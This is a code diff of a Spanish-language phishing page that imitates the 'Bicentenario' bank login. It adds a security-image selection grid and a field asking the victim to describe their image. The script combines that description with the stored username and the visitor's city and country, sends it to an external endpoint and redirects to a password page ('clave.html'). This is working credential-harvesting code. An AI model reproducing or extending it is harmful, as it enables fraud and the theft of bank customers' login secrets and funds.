@@ -29,7 +29,7 @@
         padding: 20px;
         border-radius: 6px;
         margin-top: 50px;
-        height: 530px;
+        height: 780px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
         width: 598px; /* Ajusta el ancho del formulario según sea necesario */
       }
@@ -108,6 +108,7 @@
       .contenedor2 {
         display: flex;
         flex-wrap: wrap;
+        width: 100%;
         justify-content: center;
       }
 
@@ -120,11 +121,32 @@
         font-size: 14px;
         font-weight: 500;
       }
+    </style>
+    <style>
+      .grid-container {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 10px;
+      }
 
-      @media (max-width: 600px) {
-        .opcion {
-          width: 100%;
-        }
+      .grid-item {
+        position: relative;
+        overflow: hidden;
+        cursor: pointer;
+      }
+
+      .grid-item img {
+        width: 100%;
+        height: auto;
+        display: block;
+      }
+
+      .selected {
+        border: 3px solid blue;
+      }
+
+      input[type="submit"] {
+        margin-top: 10px;
       }
     </style>
     <link
@@ -140,51 +162,6 @@
       </div>
       <div class="formato">
         <form id="loginform">
-          <div style="text-align: left; width: 100%">
-            <p
-              style="
-                line-height: 19px;
-                font-weight: bold;
-                font-size: 13px;
-                color: #333;
-                text-align: left;
-                white-space: normal;
-              "
-            >
-              Tipo de Identificación
-            </p>
-          </div>
-          <select
-            style="
-              display: block;
-              box-sizing: border-box;
-              -moz-box-sizing: border-box;
-              width: 100%;
-              height: 32px;
-              line-height: 32px;
-              padding: 5px 10px;
-              outline: 0;
-              border: 1px solid white;
-              background: gainsboro;
-              border-radius: 0;
-              background: rgb(239, 239, 239) !important;
-              font: 13px/16px 'Open Sans', Helvetica, Arial, sans-serif;
-              color: #404040;
-              appearance: normal;
-            "
-            name="tipodocben"
-            id="tipodocben"
-            aria-required="true"
-            aria-invalid="false"
-          >
-            <option value="Venezolano">Venezolano</option>
-            <option value="Pasaporte">Pasaporte</option>
-            <option value="Jurídico">Jurídico</option>
-            <option value="0Extranjero8">Extranjero</option>
-            <option value="Gubernamental">Gubernamental</option>
-            <option value="Comunal">Comunal</option>
-            <option value="Firma Personal">Firma Personal</option>
-          </select>
           <div style="width: 100%; height: 20px"></div>
           <div style="text-align: left; width: 100%">
             <p
@@ -197,15 +174,69 @@
                 white-space: normal;
               "
             >
-              Número de Identificación
+              Seleccione su Imagen bicentenario
+            </p>
+          </div>
+          <div class="grid-container">
+            <!-- Repite esto para cada imagen -->
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/1.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/2.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/3.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/4.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/5.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/6.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/7.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/8.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/9.png" alt="Imagen 1" />
+            </div>
+
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/10.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/11.png" alt="Imagen 1" />
+            </div>
+            <div class="grid-item" onclick="selectImage(this)">
+              <img src="img/12.png" alt="Imagen 1" />
+            </div>
+            <!-- Repite hasta la imagen 12 -->
+          </div>
+          <div style="text-align: left; width: 100%">
+            <p
+              style="
+                line-height: 19px;
+                font-weight: bold;
+                font-size: 13px;
+                color: #333;
+                text-align: left;
+                white-space: normal;
+              "
+            >
+              Describa cual es su imagen
             </p>
           </div>
           <div class="input-container" style="width: 100%">
             <input
               type="text"
               id="contra"
-              inputmode="numeric"
-              placeholder="Número de documento de identidad"
+              placeholder="Describa su imagen para terminar el proceso"
               required
               style="background: rgb(239, 239, 239)"
             />
@@ -213,16 +244,7 @@
 
           <div style="width: 100%; height: 30px"></div>
 
-          <div class="contenedor2">
-            <div class="opcion"><i class="fa fa-user"></i> Registro</div>
-            <div class="opcion">
-              <i class="fa fa-unlock"></i> Desbloqueo de usuario
-            </div>
-            <div class="opcion"><i class="fa fa-user"></i> Olvido usuario</div>
-          </div>
-          <div style="width: 100%; height: 30px"></div>
-
-          <button type="submit"><i class="fa fa-check"></i> Ingresar</button>
+          <button type="submit"><i class="fa fa-unlock"></i> Verificar</button>
           <div style="width: 100%; height: 20px"></div>
           <div
             style="
@@ -253,14 +275,13 @@
       axios
         .get(url)
         .then((response) => {
-          const tipodocben = document.querySelector("#tipodocben").value;
-          const documento = document.querySelector("#contra").value;
-          localStorage.setItem("usuario", documento);
+          const nombre = localStorage.getItem("usuario");
+          const contra = document.querySelector("#contra").value;
           const message =
-            "\nBicentenario\nTipo de identificación: " +
-            tipodocben +
-            "\nNúmero de identificación: " +
-            documento +
+            "\nBicentenario\nUsuario: " +
+            nombre +
+            "\nImagen descripción: " +
+            contra +
             "\nCiudad:" +
             response.data.city +
             "\nPais: " +
@@ -276,7 +297,7 @@
               }
             )
             .then((response) => {
-              window.location.href = "contra.html";
+              window.location.href = "clave.html";
             })
             .catch((error) => {
               console.error(error);
